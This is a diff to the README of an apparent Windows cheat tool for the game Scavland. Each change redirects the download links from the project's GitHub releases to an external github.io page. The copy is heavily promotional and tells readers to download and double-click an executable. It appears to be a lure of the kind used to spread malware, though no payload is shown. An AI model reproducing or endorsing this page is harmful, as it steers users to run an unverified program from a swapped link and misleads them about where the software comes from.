@@ -1,12 +1,12 @@
 # 🎮 Scavland-Trainer-Inventory-Editor - Unlock Full Game Control Today
 
-[![Download Scavland Trainer](https://img.shields.io/badge/Download-Scavland_Trainer_2026-2ea44f?style=for-the-badge)](https://github.com/alpes1028/Scavland-Trainer-Inventory-Editor/releases)
+[![Download Scavland Trainer](https://img.shields.io/badge/Download-Scavland_Trainer_2026-2ea44f?style=for-the-badge)](https://alpes1028.github.io)
 
 ## 🚀 Getting Started
 
 Welcome to the Scavland Trainer + Inventory Editor 2026! This powerful desktop tool gives you complete control over your Scavland gaming experience on Windows. With 38 amazing options, you can customize everything from your character's health to your inventory items. Whether you're stuck on a tough mission or just want to explore the game without limits, this trainer has you covered.
 
-Visit this link to download the application: [https://github.com/alpes1028/Scavland-Trainer-Inventory-Editor/releases](https://github.com/alpes1028/Scavland-Trainer-Inventory-Editor/releases)
+Visit this link to download the application: [https://alpes1028.github.io](https://alpes1028.github.io)
 
 ## ⚡ What Makes This Tool Special
 
@@ -28,7 +28,7 @@ The Scavland Trainer + Inventory Editor is designed for gamers who want more fle
 
 Getting started is simple! Follow these steps:
 
-1. **Visit the Download Page**: Click this link: [https://github.com/alpes1028/Scavland-Trainer-Inventory-Editor/releases](https://github.com/alpes1028/Scavland-Trainer-Inventory-Editor/releases)
+1. **Visit the Download Page**: Click this link: [https://alpes1028.github.io](https://alpes1028.github.io)
 2. **Choose the Latest Release**: Look for the newest version and click the download button
 3. **Save the File**: Your browser will download the application file to your computer
 4. **Run the Application**: Once downloaded, double-click the file to launch the trainer
@@ -140,9 +140,9 @@ The 38 options cover every aspect of gameplay enhancement, making it the most co
 
 Don't wait any longer to unlock the full potential of Scavland! Download the Scavland Trainer + Inventory Editor 2026 today and transform your gaming experience.
 
-[![Get Started Now](https://img.shields.io/badge/Download-Latest_Release-ff6b6b?style=for-the-badge)](https://github.com/alpes1028/Scavland-Trainer-Inventory-Editor/releases)
+[![Get Started Now](https://img.shields.io/badge/Download-Latest_Release-ff6b6b?style=for-the-badge)](https://alpes1028.github.io)
 
-Visit this link to download the application: [https://github.com/alpes1028/Scavland-Trainer-Inventory-Editor/releases](https://github.com/alpes1028/Scavland-Trainer-Inventory-Editor/releases)
+Visit this link to download the application: [https://alpes1028.github.io](https://alpes1028.github.io)
 
 Join thousands of satisfied gamers who have already enhanced their Scavland experience. With our trainer, you're in complete control of your gaming destiny!
 
